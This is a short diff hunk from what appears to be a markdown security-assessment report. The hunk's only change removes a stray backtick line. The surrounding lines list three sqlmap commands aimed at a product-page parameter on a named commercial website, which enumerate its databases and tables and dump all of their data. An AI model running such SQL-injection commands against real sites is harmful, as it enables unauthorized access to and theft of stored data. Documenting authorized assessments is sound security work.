@@ -41,7 +41,6 @@ Providing a step-by-step guide on how to use the tools and perform the assessmen
    sqlmap -u "https://www.vestil.com/product.php?FID=1430" --dbs
    sqlmap -u "https://www.vestil.com/product.php?FID=1430" --tables
    sqlmap -u "https://www.vestil.com/product.php?FID=1430" --dump-all
-  ``
 
 ## Findings
 
